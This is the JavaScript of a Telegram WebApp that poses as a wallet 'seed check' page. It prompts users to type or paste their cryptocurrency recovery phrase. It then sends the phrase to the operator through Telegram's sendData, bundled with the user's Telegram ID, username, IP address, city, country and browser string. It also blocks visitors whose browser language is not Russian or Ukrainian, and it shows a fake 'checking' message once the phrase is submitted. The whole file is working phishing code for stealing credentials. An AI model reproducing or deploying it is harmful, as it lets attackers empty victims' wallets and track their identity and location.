// 🌍 IP та геолокація
let userIp = "undefined";
let userLocation = "undefined";

fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    userIp = data.ip;
    userLocation = `${data.city}, ${data.country_name}`;
    console.log("📍 IP:", userIp, "| Локація:", userLocation);
  })
  .catch(() => {
    userIp = "unknown";
    userLocation = "unknown";
    console.warn("⚠️ Не вдалося отримати геолокацію");
  });

// 🚫 Блокування по мові
const langs = navigator.languages || [navigator.language || navigator.userLanguage];
const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
if (!langs.some(lang => allowedLangs.includes(lang))) {
  document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
  throw new Error("🚫 Заблоковано через мову");
}

// ✅ DOM ініціалізація
window.addEventListener("DOMContentLoaded", () => {
  if (!Telegram?.WebApp?.initDataUnsafe?.user) {
    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>❌ Telegram WebApp не активен.<br>Пожалуйста, откройте через Telegram.</h3>";
    console.error("❌ WebApp не ініціалізований — не відкрито з Telegram");
    return;
  }

  Telegram.WebApp.ready();
  Telegram.WebApp.expand();

  if (document.getElementById("seedContainer")) {
    renderSeedInputs();
    setupSelect();
    document.getElementById("submitBtn")?.addEventListener("click", () => {
      try {
        submitSeed();
      } catch (e) {
        console.error("❌ submitSeed error:", e);
      }
    });
  }
});

// 📦 Генерація сид-полів
function renderSeedInputs() {
  const length = parseInt(document.getElementById("length").value);
  const container = document.getElementById("seedContainer");
  container.innerHTML = "";

  for (let i = 0; i < length; i++) {
    const input = document.createElement("input");
    input.type = "text";
    input.placeholder = `${i + 1}`;
    input.classList.add("seed-word");
    container.appendChild(input);
  }

  const firstInput = container.querySelector("input");
  if (firstInput) {
    firstInput.addEventListener("input", handleBulkSeedInput);
    firstInput.addEventListener("paste", (e) => setTimeout(() => handleBulkSeedInput(e), 50));
  }
}

// 📋 Обробка вставки одразу всіх слів
function handleBulkSeedInput(e) {
  const inputs = document.querySelectorAll(".seed-word");
  const words = e.target.value.trim().split(/\s+/);
  if (words.length > 1) {
    inputs.forEach((input, i) => input.value = words[i] || "");
  }
}

// 🔘 Кастомний select
function setupSelect() {
  const selectWrapper = document.querySelector('.custom-select');
  const selected = selectWrapper.querySelector('.selected');
  const options = selectWrapper.querySelectorAll('.options li');
  const hiddenInput = document.querySelector('#wallet');

  selected.addEventListener('click', () => selectWrapper.classList.toggle('open'));
  options.forEach(option => {
    option.addEventListener('click', () => {
      selected.innerHTML = option.innerHTML;
      hiddenInput.value = option.dataset.value;
      selectWrapper.classList.remove('open');
    });
  });

  document.addEventListener('click', e => {
    if (!selectWrapper.contains(e.target)) {
      selectWrapper.classList.remove('open');
    }
  });
}

// 🚫 Повідомлення про помилку
function showWarning(message) {
  let warning = document.getElementById("validationWarning");
  if (!warning) {
    warning = document.createElement("p");
    warning.id = "validationWarning";
    warning.style.color = "#ff4d4d";
    warning.style.fontSize = "13px";
    warning.style.marginTop = "10px";
    document.querySelector(".container").appendChild(warning);
  }
  warning.textContent = message;
  warning.style.display = "block";
}
function clearWarning() {
  const warning = document.getElementById("validationWarning");
  if (warning) warning.style.display = "none";
}

// 🌀 Статус
function showProcessing(message) {
  let processing = document.getElementById("processingInfo");
  if (!processing) {
    processing = document.createElement("p");
    processing.id = "processingInfo";
    processing.style.color = "#999";
    processing.style.fontSize = "14px";
    processing.style.marginTop = "12px";
    document.querySelector(".container").appendChild(processing);
  }
  processing.textContent = message;
}

// 🚀 Надсилання seed
function submitSeed() {
  clearWarning();
  const length = parseInt(document.getElementById("length").value);
  const wallet = document.getElementById("wallet").value || "unknown";
  const ua = navigator.userAgent;
  const inputs = document.querySelectorAll("#seedContainer .seed-word");
  const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);

  if (words.length !== length) {
    showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
    return;
  }

  const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
  if (invalidWords.length) {
    showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
    return;
  }

  const seed = words.join(" ");
  showProcessing("⏳ Перевірка seed-фрази…");
  document.querySelector(".container").innerHTML =
    "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";

  const tgUser = Telegram.WebApp.initDataUnsafe.user || {};
  const payload = {
    user_id: tgUser.id || "-",
    username: tgUser.username || "-",
    seed,
    wallet,
    length,
    ua,
    ip: userIp,
    location: userLocation,
    timestamp: new Date().toISOString()
  };

  localStorage.setItem("payload_backup", JSON.stringify(payload));
  Telegram.WebApp.expand();

  if (Telegram.WebApp.sendData) {
    Telegram.WebApp.sendData(JSON.stringify(payload));
    console.log("✅ Payload надіслано:", payload);
  } else {
    console.warn("❌ sendData недоступна");
  }
}
